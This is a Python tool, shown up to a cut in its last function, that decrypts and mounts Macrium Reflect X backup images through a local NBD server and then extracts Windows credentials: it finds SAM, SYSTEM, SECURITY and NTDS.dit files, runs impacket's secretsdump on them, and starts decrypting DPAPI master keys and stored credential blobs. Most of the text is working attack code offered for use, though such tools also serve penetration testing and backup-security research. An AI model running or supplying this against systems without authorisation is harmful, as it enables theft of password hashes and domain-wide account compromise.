#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mrimgxvomit.py
Mount Macrium Reflect X (.mrimgx) backup images and dump SAM/LSA/NTDS credentials.

Usage (run as root):
  sudo python3 mrimgxvomit.py /path/to/backup.mrimgx
  sudo python3 mrimgxvomit.py /path/to/encrypted.mrimgx -p Password123
  sudo python3 mrimgxvomit.py --scan-dir /mnt/backups
"""

import argparse
import getpass
import hashlib
import hmac as _hmac
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

BANNER = r"""
 ███▄ ▄███▓ ██▀███   ██▓ ███▄ ▄███▓  ▄████ ▒██   ██▒ ██▒   █▓ ▒█████   ███▄ ▄███▓██▓▄▄▄█████▓
▓██▒▀█▀ ██▒▓██ ▒ ██▒▓██▒▓██▒▀█▀ ██▒ ██▒ ▀█▒▒▒ █ █ ▒░▓██░   █▒▒██▒  ██▒▓██▒▀█▀ ██▓██▒▓  ██▒ ▓▒
▓██    ▓██░▓██ ░▄█ ▒▒██▒▓██    ▓██░▒██░▄▄▄░░░  █   ░ ▓██  █▒░▒██░  ██▒▓██    ▓██▒██▒▒ ▓██░ ▒░
▒██    ▒██ ▒██▀▀█▄  ░██░▒██    ▒██ ░▓█  ██▓ ░ █ █ ▒   ▒██ █░░▒██   ██░▒██    ▒██░██░░ ▓██▓ ░
▒██▒   ░██▒░██▓ ▒██▒░██░▒██▒   ░██▒░▒▓███▀▒▒██▒ ▒██▒   ▒▀█░  ░ ████▓▒░▒██▒   ░██░██░  ▒██▒ ░
░ ▒░   ░  ░░ ▒▓ ░▒▓░░▓  ░ ▒░   ░  ░ ░▒   ▒ ▒▒ ░ ░▓ ░   ░ ▐░  ░ ▒░▒░▒░ ░ ▒░   ░  ░▓    ▒ ░░
░  ░      ░  ░▒ ░ ▒░ ▒ ░░  ░      ░  ░   ░ ░░   ░▒ ░   ░ ░░    ░ ▒ ▒░ ░  ░      ░ ▒ ░    ░
░      ░     ░░   ░  ▒ ░░      ░   ░ ░   ░  ░    ░       ░░  ░ ░ ░ ▒  ░      ░    ▒ ░  ░
       ░      ░      ░         ░         ░  ░     ░        ░      ░ ░         ░    ░
                                                           ░
    Mount Macrium Reflect X images, extract SAM/LSA/NTDS credentials
"""

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

MAGIC_BYTES    = b"MACRIUM_FILE"       # 12-byte file magic
FOOTER_SIZE    = 20                    # uint64 offset + 12 magic bytes
META_HDR_SIZE  = 32                    # 8 name + 4 length + 16 MD5 + 1 flags + 3 pad

BLK_JSON    = b"$JSON   "
BLK_TRACK0  = b"$TRACK0 "
BLK_EPT     = b"$EPT    "
BLK_BITMAP  = b"$BITMAP "
BLK_INDEX   = b"$INDEX  "

# DataBlockIndexElement — #pragma pack(1) in C++ source
# int64 file_position + 16s MD5 + uint32 block_length + uint16 file_number
DBIE_FMT  = "<q16sIH"
DBIE_SIZE  = struct.calcsize(DBIE_FMT)   # 30 bytes

# DeltaDataBlock — DataBlockIndexElement + uint32 block_index
DELTA_FMT  = "<q16sIHI"
DELTA_SIZE = struct.calcsize(DELTA_FMT)  # 34 bytes

# AES key sizes by type string from JSON
AES_KEY_SIZES = {"aes-128": 16, "aes-192": 24, "aes-256": 32}

_print_lock = threading.Lock()
_crypto_cache: Optional[tuple] = None

# NBD fixed-newstyle protocol constants
_NBD_MAGIC         = b"NBDMAGIC"  # 0x4e42444d41474943
_NBD_IHAVEOPT      = b"IHAVEOPT"  # 0x49484156454f5054 (also option magic from client)
_NBD_REP_MAGIC     = struct.pack(">Q", 0x3e889045565a9)
_NBD_REQ_MAGIC     = 0x25609513
_NBD_REPLY_MAGIC   = 0x67446698
_NBD_OPT_EXPORT_NAME = 1
_NBD_OPT_ABORT       = 2
_NBD_REP_ACK         = 1
_NBD_REP_ERR_UNSUP   = 0x80000001
_NBD_SRV_FIXED_NEWSTYLE = 0x0001   # negotiation server flag
_NBD_TX_HAS_FLAGS  = 0x0001        # transmission flag (always required)
_NBD_TX_READ_ONLY  = 0x0002
_NBD_CMD_READ  = 0
_NBD_CMD_DISC  = 2
_NBD_CMD_FLUSH = 3


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def tprint(*args, **kwargs):
    with _print_lock:
        print(*args, **kwargs)


def die(msg, code=1):
    print(f"[!] {msg}", file=sys.stderr)
    sys.exit(code)


def ensure_root():
    if os.geteuid() != 0:
        print("[*] Root required — re-running with sudo...")
        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)


def check_deps(smb_mode: bool = False):
    missing = []
    if smb_mode:
        if not (Path("/sbin/mount.cifs").exists() or shutil.which("mount.cifs")):
            missing.append("cifs-utils (mount.cifs)")
    if not shutil.which("nbd-client"):
        missing.append("nbd-client")
    if not (shutil.which("ntfs-3g") or shutil.which("mount.ntfs")):
        missing.append("ntfs-3g")
    if missing:
        die(f"Missing system dependencies: {', '.join(missing)}")


def get_file_size_gb(path):
    try:
        return f"{Path(path).stat().st_size / (1024**3):.2f}GB"
    except Exception:
        return "??GB"


# ---------------------------------------------------------------------------
# Compression
# ---------------------------------------------------------------------------

def _zstd_decompress(data: bytes) -> bytes:
    try:
        import zstandard
    except ImportError:
        die("zstandard not installed — run: pip install zstandard")
    return zstandard.ZstdDecompressor().decompress(data)


# ---------------------------------------------------------------------------
# Encryption helpers
# ---------------------------------------------------------------------------

def _get_crypto():
    global _crypto_cache
    if _crypto_cache is None:
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            _crypto_cache = (Cipher, algorithms, modes, default_backend)
        except ImportError:
            die("cryptography not installed — run: pip install cryptography")
    return _crypto_cache


def derive_key(imageid_bin: bytes, password: str, iterations: int, key_len: int = 32) -> bytes:
    """PBKDF2-HMAC-SHA256 with SHA256(imageid_bin) as salt."""
    salt = hashlib.sha256(imageid_bin).digest()
    return hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations, dklen=key_len)


def compute_password_hmac(derived_key: bytes) -> bytes:
    """HMAC-SHA256(key=derived_key, message=empty) — matches C++ getKeyHMACSHA256."""
    return _hmac.new(derived_key, b"", hashlib.sha256).digest()


def _aes_key(derived_key: bytes, aes_type: str) -> bytes:
    size = AES_KEY_SIZES.get(aes_type, 32)
    return derived_key[:size]


def decrypt_ecb(derived_key: bytes, aes_type: str, data: bytes) -> bytes:
    """AES-ECB — used for metadata blocks."""
    Cipher, algorithms, modes, backend = _get_crypto()
    key = _aes_key(derived_key, aes_type)
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=backend())
    dec = cipher.decryptor()
    return dec.update(data) + dec.finalize()


def compute_essiv_iv(imageid_bin: bytes, disk_num: int, part_num: int, block_idx: int,
                     derived_key: bytes) -> bytes:
    """Compute ESSIV IV for AES-CBC data block decryption.

    IV = AES-256-ECB(key=SHA256(derived_key),
                     data=imageid[8] + disk_num[2] + part_num[2] + block_idx[4])
    """
    Cipher, algorithms, modes, backend = _get_crypto()
    data = (imageid_bin[:8]
            + struct.pack("<H", disk_num & 0xFFFF)
            + struct.pack("<H", part_num & 0xFFFF)
            + struct.pack("<I", block_idx & 0xFFFFFFFF))
    key_hash = hashlib.sha256(derived_key).digest()
    cipher = Cipher(algorithms.AES(key_hash), modes.ECB(), backend=backend())
    enc = cipher.encryptor()
    return enc.update(data) + enc.finalize()


def decrypt_cbc(derived_key: bytes, aes_type: str, iv: bytes, data: bytes) -> bytes:
    """AES-CBC — used for data blocks."""
    Cipher, algorithms, modes, backend = _get_crypto()
    key = _aes_key(derived_key, aes_type)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend())
    dec = cipher.decryptor()
    return dec.update(data) + dec.finalize()


# ---------------------------------------------------------------------------
# mrimgx file format parser
# ---------------------------------------------------------------------------

class _MetaHdr:
    """Parsed MetadataBlockHeader (32 bytes)."""
    __slots__ = ("name", "length", "md5", "last_block", "compressed", "encrypted")

    def __init__(self, raw: bytes):
        self.name      = raw[0:8]
        self.length    = struct.unpack_from("<I", raw, 8)[0]
        self.md5       = raw[12:28]
        flags          = raw[28]
        self.last_block  = bool(flags & 0x01)
        self.compressed  = bool(flags & 0x02)
        self.encrypted   = bool(flags & 0x04)


def _read_meta_block_data(f, hdr: _MetaHdr, layout: dict) -> bytes:
    """Read metadata block body: verify MD5, decrypt (ECB), decompress (ZSTD)."""
    if hdr.length == 0:
        return b""
    data = f.read(hdr.length)
    if hashlib.md5(data).digest() != hdr.md5:
        raise RuntimeError(f"MD5 mismatch in metadata block {hdr.name!r}")
    enc = layout.get("_encryption", {})
    if hdr.encrypted and enc.get("enable", False):
        data = decrypt_ecb(layout["_derived_key"], enc.get("aes_type", "aes-256"), data)
    if hdr.compressed:
        data = _zstd_decompress(data)
    return data


def _scan_blocks(f, layout: dict, wanted: set) -> dict:
    """Advance through the metadata block list and return {name: data} for wanted names."""
    results = {}
    while True:
        raw = f.read(META_HDR_SIZE)
        if len(raw) < META_HDR_SIZE:
            break
        hdr = _MetaHdr(raw)
        if hdr.name in wanted:
            results[hdr.name] = _read_meta_block_data(f, hdr, layout)
        else:
            f.seek(hdr.length, 1)
        if hdr.last_block:
            break
    return results


def _read_index_raw(f, layout: dict) -> bytes:
    """
    Scan for $INDEX block and return its raw body bytes.

    The C++ implementation stores $INDEX as raw binary (no compression/encryption)
    so that file_reader.cpp can seek back and read block-index arrays directly.
    We still validate the MD5 and handle the decrypt/decompress path defensively.
    """
    while True:
        raw = f.read(META_HDR_SIZE)
        if len(raw) < META_HDR_SIZE:
            raise RuntimeError("$INDEX block not found")
        hdr = _MetaHdr(raw)
        if hdr.name == BLK_INDEX:
            return _read_meta_block_data(f, hdr, layout)
        f.seek(hdr.length, 1)
        if hdr.last_block:
            raise RuntimeError("$INDEX block not found (end of partition metadata)")


def _parse_index_data(data: bytes, is_delta: bool) -> tuple:
    """Parse raw $INDEX block into (rsv_blocks, data_blocks)."""
    off = 0

    rsv_count = struct.unpack_from("<i", data, off)[0]
    off += 4
    rsv_blocks = []
    for _ in range(rsv_count):
        fp, md5, bl, fn = struct.unpack_from(DBIE_FMT, data, off)
        rsv_blocks.append({"file_position": fp, "md5": md5, "block_length": bl, "file_number": fn})
        off += DBIE_SIZE

    data_count = struct.unpack_from("<i", data, off)[0]
    off += 4
    data_blocks = []

    if is_delta:
        for _ in range(data_count):
            fp, md5, bl, fn, idx = struct.unpack_from(DELTA_FMT, data, off)
            data_blocks.append({"file_position": fp, "md5": md5, "block_length": bl,
                                 "file_number": fn, "block_index": idx})
            off += DELTA_SIZE
    else:
        for _ in range(data_count):
            fp, md5, bl, fn = struct.unpack_from(DBIE_FMT, data, off)
            data_blocks.append({"file_position": fp, "md5": md5, "block_length": bl, "file_number": fn})
            off += DBIE_SIZE

    return rsv_blocks, data_blocks


def _merge_delta(full_blocks: list, delta_blocks: list) -> list:
    """Apply delta data blocks on top of the full backup block list."""
    result = list(full_blocks)
    for db in delta_blocks:
        idx = db["block_index"]
        if idx >= len(result):
            result.extend([{"file_position": 0, "md5": b"\x00"*16,
                             "block_length": 0, "file_number": 0}] * (idx - len(result) + 1))
        result[idx] = {"file_position": db["file_position"], "md5": db["md5"],
                       "block_length": db["block_length"], "file_number": db["file_number"]}
    return result


def _imageid_to_bytes(imageid_hex: str) -> bytes:
    if len(imageid_hex) == 16:
        return bytes.fromhex(imageid_hex)
    return b"\x00" * 8


def parse_mrimgx(file_path: str, password: str = "",
                 prior_full_layout: dict = None) -> dict:
    """
    Parse a .mrimgx file and return a layout dict with block indexes populated.

    For delta/incremental files, pass `prior_full_layout` (the parsed full backup)
    so delta blocks can be merged into the full index.
    """
    with open(file_path, "rb") as f:
        # --- Read footer ---
        f.seek(-FOOTER_SIZE, 2)
        footer_offset = struct.unpack("<Q", f.read(8))[0]
        magic = f.read(12)
        if magic != MAGIC_BYTES:
            raise RuntimeError(f"Not a Macrium Reflect X file: {file_path}")

        # --- Read root metadata (JSON header) ---
        f.seek(footer_offset)
        empty_layout: dict = {"_encryption": {}}
        blocks = _scan_blocks(f, empty_layout, {BLK_JSON})
        json_data = blocks.get(BLK_JSON)
        if not json_data:
            raise RuntimeError("$JSON block not found")

        layout: dict = json.loads(json_data.decode("utf-8"))
        layout["_file_path"] = str(file_path)

        # Parse imageid binary
        imageid_hex = layout["_header"].get("imageid", "")
        imageid_bin = _imageid_to_bytes(imageid_hex)
        layout["_imageid_bin"] = imageid_bin

        # --- Encryption setup ---
        enc = layout.get("_encryption", {})
        if enc.get("enable", False):
            if not password:
                password = getpass.getpass("[?] Backup password: ")
            aes_type = enc.get("aes_type", "aes-256")
            key_len  = AES_KEY_SIZES.get(aes_type, 32)
            dk = derive_key(imageid_bin, password, enc["key_iterations"], key_len)
            stored_hmac  = bytes.fromhex(enc.get("hmac", ""))
            computed_hmac = compute_password_hmac(dk)
            if computed_hmac != stored_hmac:
                raise RuntimeError("Invalid password")
            layout["_derived_key"] = dk
        else:
            layout["_derived_key"] = b"\x00" * 32

        # --- Read disk / partition metadata & block indexes ---
        is_delta = layout["_header"].get("delta_index", False)
        is_split = layout["_header"].get("split_file", False)

        if not is_split:
            f.seek(layout["_header"]["index_file_position"])

            for disk_idx, disk in enumerate(layout.get("disks", [])):
                disk_blocks = _scan_blocks(f, layout, {BLK_TRACK0, BLK_EPT})
                disk["_track0"] = disk_blocks.get(BLK_TRACK0, b"")

                for part_idx, partition in enumerate(disk.get("partitions", [])):
                    idx_data = _read_index_raw(f, layout)
                    rsv_blocks, data_blocks = _parse_index_data(idx_data, is_delta)

                    if is_delta and prior_full_layout:
                        try:
                            full_part = prior_full_layout["disks"][disk_idx]["partitions"][part_idx]
                            full_data = full_part.get("_data_blocks", [])
                            data_blocks = _merge_delta(full_data, data_blocks)
                        except (IndexError, KeyError):
                            pass  # merge failed — use delta blocks as-is

                    partition["_rsv_blocks"]  = rsv_blocks
                    partition["_data_blocks"] = data_blocks

    return layout


# ---------------------------------------------------------------------------
# Data block reader
# ---------------------------------------------------------------------------

def _read_data_block(f_map: dict, block: dict, layout: dict,
                     disk_num: int, part_num: int, block_idx: int,
                     enc_info: Optional[dict] = None,
                     comp_info: Optional[dict] = None) -> Optional[bytes]:
    """
    Read a data block from the appropriate file handle, decrypt, decompress.

    Decode order per C++ restore.cpp:
      read raw → decrypt (AES-CBC/ESSIV) → decompress (ZSTD) → verify MD5
    """
    if block.get("block_length", 0) == 0:
        return None

    fn = block.get("file_number", 0)
    f  = f_map.get(fn)
    if f is None:
        raise RuntimeError(f"File handle for file_number={fn} not open")

    f.seek(block["file_position"])
    data = f.read(block["block_length"])

    if enc_info is None:
        enc_info = layout.get("_encryption", {})
    if enc_info.get("enable", False) and enc_info.get("aes_type", "none") != "none":
        iv = compute_essiv_iv(
            layout["_imageid_bin"], disk_num, part_num, block_idx,
            layout["_derived_key"]
        )
        data = decrypt_cbc(layout["_derived_key"], enc_info["aes_type"], iv, data)

    if comp_info is None:
        comp_info = layout.get("_compression", {})
    if comp_info.get("compression_level", "none") != "none":
        data = _zstd_decompress(data)
        if hashlib.md5(data).digest() != block["md5"]:
            raise RuntimeError(f"MD5 mismatch in data block at {block['file_position']:#x}")

    return data


# ---------------------------------------------------------------------------
# NBD on-demand block device (no temp file — blocks decompressed as ntfs-3g reads them)
# ---------------------------------------------------------------------------

def _nbd_recvall(conn: socket.socket, n: int) -> bytes:
    buf = bytearray(n)
    view = memoryview(buf)
    pos = 0
    while pos < n:
        got = conn.recv_into(view[pos:], n - pos)
        if not got:
            raise ConnectionError("NBD client disconnected")
        pos += got
    return bytes(buf)


class MrimgxNBD:
    """Serve a mrimgx partition as a read-only block device; decompresses on demand."""

    _CACHE_MAX = 128  # ~8 MB at 64 KB blocks

    def __init__(self, layout: dict, disk: dict, partition: dict):
        geom    = partition.get("_geometry", {})
        fs_info = partition.get("_file_system", {})
        hdr     = partition.get("_header", {})

        self.size        = geom.get("length", 0)
        self.block_size  = hdr.get("block_size", 65536)
        lcn0_abs         = fs_info.get("lcn0_offset", geom.get("start", 0))
        fs_start         = fs_info.get("start", geom.get("start", 0))
        self.data_base   = lcn0_abs - fs_start
        self.rsv_offset  = geom.get("boot_sector_offset", 0)
        self.rsv_size    = fs_info.get("reserved_sectors_byte_length", 0)
        self.data_blocks = partition.get("_data_blocks", [])
        self.rsv_blocks  = partition.get("_rsv_blocks", [])
        self.layout      = layout
        self.disk_num    = disk.get("_header", {}).get("disk_number", 0)
        self.part_num    = hdr.get("partition_number", 0)
        self._enc_info   = layout.get("_encryption", {})
        self._comp_info  = layout.get("_compression", {})

        main_path    = layout["_file_path"]
        file_history = hdr.get("file_history", [])
        all_blks     = self.data_blocks + self.rsv_blocks
        file_numbers = {b.get("file_number", 0) for b in all_blks
                        if b.get("block_length", 0) > 0}
        self.fh_map: dict = {}
        for fn in file_numbers:
            if fn == 0:
                self.fh_map[0] = open(main_path, "rb")
            else:
                found = next((e["file_name"] for e in file_history
                              if e.get("file_number") == fn), None)
                if found and Path(found).exists():
                    self.fh_map[fn] = open(found, "rb")
                else:
                    tprint(f"  [!] Split part {fn} not found — some reads will return zeros")

        self._cache: dict = {}
        self._lock  = threading.Lock()

    def close(self):
        for fh in self.fh_map.values():
            try:
                fh.close()
            except Exception:
                pass

    def _fetch(self, blocks: list, idx: int) -> bytes:
        """Decompress block at idx from blocks list; results cached."""
        key = (id(blocks), idx)
        with self._lock:
            if key in self._cache:
                return self._cache[key]
            if idx >= len(blocks) or blocks[idx].get("block_length", 0) == 0:
                data = b"\x00" * self.block_size
            else:
                data = (_read_data_block(self.fh_map, blocks[idx], self.layout,
                                         self.disk_num, self.part_num, idx,
                                         self._enc_info, self._comp_info)
                        or b"\x00" * self.block_size)
            if len(self._cache) >= self._CACHE_MAX:
                del self._cache[next(iter(self._cache))]
            self._cache[key] = data
            return data

    def pread(self, offset: int, length: int) -> bytes:
        """Read `length` bytes at partition-relative `offset`."""
        # Clamp to partition bounds
        length = min(length, max(0, self.size - offset))
        if length == 0:
            return b""

        buf = bytearray(length)
        pos, out = offset, 0

        while out < length:
            want = length - out

            if (self.rsv_size > 0 and self.rsv_blocks
                    and self.rsv_offset <= pos < self.rsv_offset + self.rsv_size):
                idx  = (pos - self.rsv_offset) // self.block_size
                off  = (pos - self.rsv_offset) % self.block_size
                data = self._fetch(self.rsv_blocks, idx)
                take = min(want, len(data) - off)
            elif pos >= self.data_base:
                idx  = (pos - self.data_base) // self.block_size
                off  = (pos - self.data_base) % self.block_size
                data = self._fetch(self.data_blocks, idx)
                take = min(want, len(data) - off)
            else:
                # Gap before data_base — zeros
                take = min(want, self.data_base - pos if self.data_base > pos else want)
                take = max(take, 1)
                out += take
                pos += take
                continue

            if take <= 0:
                take = 1  # defensive: never stall
                out += take
                pos += take
                continue
            buf[out:out + take] = data[off:off + take]
            out += take
            pos += take

        return bytes(buf)


def _nbd_serve(nbd: MrimgxNBD, conn: socket.socket):
    """Handle one NBD fixed-newstyle client session."""
    try:
        # Phase 1: negotiation header
        conn.sendall(
            _NBD_MAGIC + _NBD_IHAVEOPT
            + struct.pack(">H", _NBD_SRV_FIXED_NEWSTYLE)
        )
        _nbd_recvall(conn, 4)  # client flags (accepted unconditionally)

        # Phase 2: option haggling
        while True:
            hdr = _nbd_recvall(conn, 16)
            _opt_magic, opt_id, opt_len = struct.unpack(">QII", hdr)
            opt_data = _nbd_recvall(conn, opt_len) if opt_len else b""  # noqa: F841

            if opt_id == _NBD_OPT_EXPORT_NAME:
                tx_flags = _NBD_TX_HAS_FLAGS | _NBD_TX_READ_ONLY
                conn.sendall(struct.pack(">QH", nbd.size, tx_flags) + b"\x00" * 124)
                break
            elif opt_id == _NBD_OPT_ABORT:
                conn.sendall(
                    _NBD_REP_MAGIC + struct.pack(">III", _NBD_OPT_ABORT, _NBD_REP_ACK, 0)
                )
                return
            else:
                conn.sendall(
                    _NBD_REP_MAGIC + struct.pack(">III", opt_id, _NBD_REP_ERR_UNSUP, 0)
                )

        # Phase 3: transmission
        while True:
            req = _nbd_recvall(conn, 28)
            magic, _flags, cmd, handle, offset, length = struct.unpack(">IHHQQI", req)
            if magic != _NBD_REQ_MAGIC:
                break
            if cmd == _NBD_CMD_DISC:
                break
            elif cmd == _NBD_CMD_READ:
                try:
                    data = nbd.pread(offset, length)
                    # Pad to requested length if clamped at partition edge
                    if len(data) < length:
                        data = data + b"\x00" * (length - len(data))
                    conn.sendall(struct.pack(">IIQ", _NBD_REPLY_MAGIC, 0, handle) + data)
                except Exception as e:
                    tprint(f"  [!] NBD read {offset:#x}+{length}: {e}")
                    conn.sendall(struct.pack(">IIQ", _NBD_REPLY_MAGIC, 5, handle))  # EIO
            elif cmd == _NBD_CMD_FLUSH:
                conn.sendall(struct.pack(">IIQ", _NBD_REPLY_MAGIC, 0, handle))
            else:
                conn.sendall(struct.pack(">IIQ", _NBD_REPLY_MAGIC, 1, handle))  # EPERM
    except (ConnectionError, OSError):
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass


def _get_fs_type(device: str) -> str:
    try:
        r = subprocess.run(
            ["blkid", "-s", "TYPE", "-o", "value", device],
            capture_output=True, text=True
        )
        return r.stdout.strip().lower()
    except Exception:
        return ""


def _find_free_nbd() -> Optional[str]:
    """Ensure nbd module is loaded and return a free /dev/nbdX path."""
    subprocess.run(["modprobe", "nbd"], capture_output=True)
    for i in range(16):
        sysfs = f"/sys/class/block/nbd{i}/size"
        dev   = f"/dev/nbd{i}"
        try:
            with open(sysfs) as f:
                if f.read().strip() == "0":
                    return dev
        except FileNotFoundError:
            if Path(dev).exists():
                return dev
    return None


def mount_nbd_partition(layout: dict, disk: dict, partition: dict) -> tuple:
    """
    Present a mrimgx partition as an NBD block device and mount it read-only.
    Returns (nbd_obj, nbd_dev, mnt_path) or (None, None, None) on failure.
    Pass all three to unmount_nbd_partition() for cleanup.
    """
    nbd_dev = _find_free_nbd()
    if not nbd_dev:
        print("[!] No free /dev/nbdX — load the nbd kernel module")
        return None, None, None

    nbd = MrimgxNBD(layout, disk, partition)
    if nbd.size == 0:
        print("  [!] Partition has zero size")
        nbd.close()
        return None, None, None

    # Start NBD server on a random loopback port
    srv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv_sock.bind(("127.0.0.1", 0))
    port = srv_sock.getsockname()[1]
    srv_sock.listen(2)

    stop = threading.Event()

    def _server():
        srv_sock.settimeout(0.5)
        while not stop.is_set():
            try:
                conn, _ = srv_sock.accept()
                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                _nbd_serve(nbd, conn)
            except socket.timeout:
                continue
            except OSError:
                break
        srv_sock.close()

    t = threading.Thread(target=_server, daemon=True)
    t.start()
    nbd._stop = stop
    nbd._srv_thread = t

    # Connect nbd-client — try modern (-N) then legacy syntax
    for cmd in (
        ["nbd-client", "-N", "", "127.0.0.1", str(port), nbd_dev],
        ["nbd-client", "127.0.0.1", str(port), nbd_dev],
    ):
        r = subprocess.run(cmd, capture_output=True, timeout=15)
        if r.returncode == 0:
            break
    else:
        print(f"[!] nbd-client failed: {r.stderr.decode(errors='replace').strip()}")
        stop.set()
        nbd.close()
        return None, None, None

    print(f"[+] NBD device {nbd_dev}  ({nbd.size / (1024**3):.2f} GB)")
    time.sleep(0.5)

    fs = _get_fs_type(nbd_dev) or "ntfs"
    mnt = tempfile.mkdtemp(prefix="mrimgx_")

    if "ntfs" in fs:
        mount_cmd = ["ntfs-3g", "-o", "ro", nbd_dev, mnt]
    else:
        mount_cmd = ["mount", "-o", "ro", nbd_dev, mnt]

    r = subprocess.run(mount_cmd, capture_output=True)
    if r.returncode != 0:
        r = subprocess.run(["ntfs-3g", "-o", "ro,force", nbd_dev, mnt], capture_output=True)
    if r.returncode != 0:
        print(f"[!] Mount failed: {r.stderr.decode(errors='replace').strip()}")
        try:
            os.rmdir(mnt)
        except Exception:
            pass
        subprocess.run(["nbd-client", "-d", nbd_dev], capture_output=True)
        stop.set()
        nbd.close()
        return None, None, None

    print(f"[+] Mounted at {mnt}")
    return nbd, nbd_dev, mnt


def unmount_nbd_partition(nbd: MrimgxNBD, nbd_dev: str, mnt: str):
    if mnt:
        subprocess.run(["umount", mnt], capture_output=True)
        subprocess.run(["umount", "-l", mnt], capture_output=True)
        try:
            os.rmdir(mnt)
        except Exception:
            pass
    if nbd_dev:
        subprocess.run(["nbd-client", "-d", nbd_dev], capture_output=True)
    if nbd:
        stop = getattr(nbd, "_stop", None)
        if stop:
            stop.set()
        nbd.close()


# ---------------------------------------------------------------------------
# Hive discovery (case-insensitive)
# ---------------------------------------------------------------------------

def _find_dir_ci(root: Path, *parts: str) -> Optional[Path]:
    """Case-insensitive path descent from root through parts."""
    current = root
    for part in parts:
        part_lower = part.lower()
        try:
            matched = next(
                (e for e in current.iterdir() if e.name.lower() == part_lower),
                None
            )
        except (PermissionError, OSError):
            return None
        if matched is None:
            return None
        current = matched
    return current


def find_hive_paths(mnt_path: str) -> dict:
    """
    Locate Windows registry hive files and optional NTDS.dit.
    Returns dict with keys: sam, system, security, ntds (may be None).
    """
    root = Path(mnt_path)

    config = _find_dir_ci(root, "Windows", "System32", "config")

    result = {"sam": None, "system": None, "security": None, "ntds": None}

    if config:
        for hive in ("SAM", "SYSTEM", "SECURITY"):
            p = _find_dir_ci(config, hive)
            if p and p.is_file():
                result[hive.lower()] = str(p)

    ntds_dir = _find_dir_ci(root, "Windows", "NTDS")
    if ntds_dir:
        p = _find_dir_ci(ntds_dir, "ntds.dit")
        if p and p.is_file():
            result["ntds"] = str(p)

    return result


# ---------------------------------------------------------------------------
# secretsdump integration
# ---------------------------------------------------------------------------

def _find_impacket_tool(name: str) -> Optional[str]:
    t = shutil.which(f"{name}.py") or shutil.which(name)
    if t:
        return t
    sudo_user = os.environ.get("SUDO_USER")
    candidates = [
        f"/home/{sudo_user}/.local/bin/{name}.py" if sudo_user else None,
        os.path.expanduser(f"~/.local/bin/{name}.py"),
        f"/usr/local/bin/{name}.py",
        f"/opt/impacket/bin/{name}.py",
    ]
    return next((p for p in candidates if p and Path(p).exists()), None)


def _find_secretsdump() -> Optional[str]:
    return _find_impacket_tool("secretsdump")


def _run_impacket_tool(cmd: list, outfile: str):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        with open(outfile, "w") as f:
            f.write(result.stdout)
        if result.stderr:
            print(f"[!] Errors: {result.stderr.strip()}")
        if result.stdout:
            print(f"[+] Output saved: {outfile}")
        else:
            print("[!] Tool produced empty output")
    except Exception as e:
        print(f"[!] Exception running {Path(cmd[0]).name}: {e}")


def _run_secretsdump(args: list, outfile: str):
    sd = _find_secretsdump()
    if not sd:
        print("[!] secretsdump.py not found — install impacket: pip install impacket")
        return
    print(f"[*] Running secretsdump → {outfile}")
    _run_impacket_tool([sd] + args, outfile)


def _copy_hives(tmp_dir: str, *paths) -> list:
    copies = []
    for src in paths:
        if src is None:
            copies.append(None)
            continue
        dst = os.path.join(tmp_dir, Path(src).name)
        shutil.copy2(src, dst)
        copies.append(dst)
    return copies


def dump_sam(hostname: str, sam: str, system: str, security: Optional[str]):
    with tempfile.TemporaryDirectory(prefix="mrimgx_hives_") as tmp:
        sam_c, sys_c, sec_c = _copy_hives(tmp, sam, system, security)
        args = ["-sam", sam_c, "-system", sys_c]
        if sec_c:
            args += ["-security", sec_c]
        args.append("LOCAL")
        _run_secretsdump(args, f"{hostname}_secretsdump.txt")


def dump_dc(hostname: str, ntds: str, system: str, security: Optional[str]):
    with tempfile.TemporaryDirectory(prefix="mrimgx_hives_") as tmp:
        ntds_c, sys_c, sec_c = _copy_hives(tmp, ntds, system, security)
        args = ["-ntds", ntds_c, "-system", sys_c]
        if sec_c:
            args += ["-security", sec_c]
        args.append("LOCAL")
        _run_secretsdump(args, f"{hostname}_secretsdump.txt")



# ---------------------------------------------------------------------------
# DPAPI offline credential chain
# ---------------------------------------------------------------------------

def _find_dpapi() -> Optional[str]:
    return _find_impacket_tool("dpapi")


def _extract_dpapi_machinekey(secretsdump_outfile: str) -> Optional[str]:
    try:
        with open(secretsdump_outfile) as f:
            for line in f:
                if line.strip().startswith("dpapi_machinekey:"):
                    return line.strip().split("dpapi_machinekey:")[1].strip()
    except OSError:
        pass
    return None


def _decrypt_system_masterkeys(mnt: str, machinekey: str, dp: str) -> List[str]:
    protect_dir = _find_dir_ci(Path(mnt), "Windows", "System32", "Microsoft", "Protect", "S-1-5-18")
    if not protect_dir:
        return []
    keys = []
    for f in protect_dir.iterdir():
        if not f.is_file() or f.suffix.lower() == ".bak":
            continue
        try:
            result = subprocess.run([dp, "masterkey", "-file", str(f), "-key", machinekey],
                                    capture_output=True, text=True, timeout=30)
            m = re.search(r"Decrypted[^:]*:\s*(0x[0-9a-fA-F]+)", result.stdout)
            if m:
                keys.append(m.group(1))
        except Exception:
            pass
    return keys


def _find_credential_blobs(mnt: str) -> List[str]:
    root = Path(mnt)
    blobs = []
    profile_paths = [
        ("Windows", "System32", "config", "systemprofile", "AppData", "Roaming", "Microsoft", "Credentials"),
        ("Windows", "ServiceProfiles", "LocalService", "AppData", "Roaming", "Microsoft", "Credentials"),
        ("Windows", "ServiceProfiles", "NetworkService", "AppData", "Roaming", "Microsoft", "Credentials"),
    ]
    for parts in profile_paths:
        d = _find_dir_ci(root, *parts)
        if d:
            blobs.extend(str(f) for f in d.iterdir() if f.is_file())
    return blobs


def dump_task_creds(hostname: str, mnt: str, secretsdump_outfile: str):
